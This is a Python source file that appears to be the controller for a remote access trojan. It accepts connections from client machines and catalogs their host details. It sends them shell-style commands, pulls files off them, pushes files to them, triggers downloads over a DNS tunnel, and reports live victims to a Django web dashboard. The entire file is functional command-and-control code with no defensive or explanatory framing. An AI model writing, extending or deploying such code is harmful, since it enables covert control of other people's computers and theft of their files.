import socket
import threading
import time
import json
import base64
import requests
import select
from queue import Queue

class Con_Stor():
    def __init__(self, client_socket_object, addr):
        self.client_socket_object = client_socket_object
        self.addr = addr
        self.machine_info = str(client_socket_object.recv(1024).decode('ascii'))
        self.status =  "Active"

    def read_file(self, path):
        try:
            with open(path, 'rb') as file_obj:
                return base64.b64encode(file_obj.read())
        except:
            return "[+] ERROR - Error opening file"
    def write_file(self, name, content):
        try:
            with open(name, 'wb') as file_obj:
                file_obj.write(base64.b64decode(content))
                return "[+] File downloaded successfully"
        except:
            return "[+] ERROR - Error during creating a file"    


    def json_send(self, data):
        for i in range(len(data)):
            word = data[i]
            if not isinstance(word, str):
                data[i] = word.decode('utf-8')
        
        json_data = json.dumps(data).encode('utf-8')
        self.client_socket_object.send(json_data)

    def json_receive(self):
        json_data = "" 

        ready = select.select([self.client_socket_object], [], [], 1)
        if not ready[0]:
            return "[+] ERROR - Error during command execution"
        while True:
            try:
                page = self.client_socket_object.recv(1024)
                json_data += page.decode('utf-8')
                return json.loads(json_data)
            except:
                continue        
            
ACTIVE_CONNECTIONS = {}

def process_machine_info(data):
    data = data.split("|")
    info = data[-5:]
    keys = ["Node Name","OS","Version","CPU"]
    ret_data = {}
    for i in range(len(keys)):
        ret_data[keys[i]] = info[i]
    
    return ret_data

def manage_connection_status():
    for ip in ACTIVE_CONNECTIONS.keys():
        obj =  ACTIVE_CONNECTIONS[ip]
        if obj.status == "Active":
            try:
                obj.json_send("test")
                resp = obj.json_receive()
            except:
                obj.status = "Inactive"



class Server:
    def __init__(self, ip, port, django_server):
        self.socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket_obj.bind((ip, port))
        self.django_server = django_server

    def manage_listen_and_add(self):
        self.socket_obj.listen(5)
        while True:
            client_conn_object, addr = self.socket_obj.accept()
            print(addr)
            # Add to ACTIVE_CONNECTIONS dict -> indexed by IP {IP1:<object 'ConStor'>, IP2:<object 'ConStor'>}
            if addr[0] not in ACTIVE_CONNECTIONS.keys():
                con_stor = Con_Stor(client_socket_object=client_conn_object,
                                addr=addr)
                ACTIVE_CONNECTIONS[addr[0]] = con_stor
            else:
                ACTIVE_CONNECTIONS[addr[0]].status = "Active"
                ACTIVE_CONNECTIONS[addr[0]].client_socket_object = client_conn_object

    def manage_update_connection_db(self):
        while True:
            # Update connection status
            time.sleep(20)
            manage_connection_status()

            # Send connection data to the Django server
            data = {}
            for ip in ACTIVE_CONNECTIONS.keys():
                machine_inf = process_machine_info(ACTIVE_CONNECTIONS[ip].machine_info)
                machine_inf["Status"] = ACTIVE_CONNECTIONS[ip].status
                data[ip] = machine_inf
            url = f"{self.django_server}/update_conn"
            try:
                r = requests.post(url=url,json=data, timeout=0.5)
            except:
                pass

def execute_command(ip, command):
    try:
        obj = ACTIVE_CONNECTIONS[ip]
    except:
        return "Connection Pipe Broken"
    
    command = command.split()

    if command[0] == "exit":
        obj.json_send(command)
        ACTIVE_CONNECTIONS[ip].status = "Inactive"
        #RESPONSE_DIRECTORY[id] = "Closed Connection"
        return "Closed Connection"

    if command[0] == "DNS":
        if command[1] == "download":
            obj.json_send(command)
            return "Closed Connection - File being downloaded over DNS tunnel"
        else:
            return "Requested operation doesn't work over DNS tunnel"

    if command[0] == "upload":
        filename = command[1]
        data = obj.read_file(filename)
        command.append(data)

    obj.json_send(command)
    response = obj.json_receive()

    if command[0] == "download":
        data = response
        filename = ' '.join(command[1:])
        filename = filename.split('/')[-1]
        obj.write_file(filename, response)
        print(f'response - {response}')
        #RESPONSE_DIRECTORY[id] =  "File Downloaded"
        return "File Downloaded"
    else:
        #RESPONSE_DIRECTORY[id] = response
        if response == "[+] ERROR - Error during command execution":
            response = obj.json_receive()
        return response
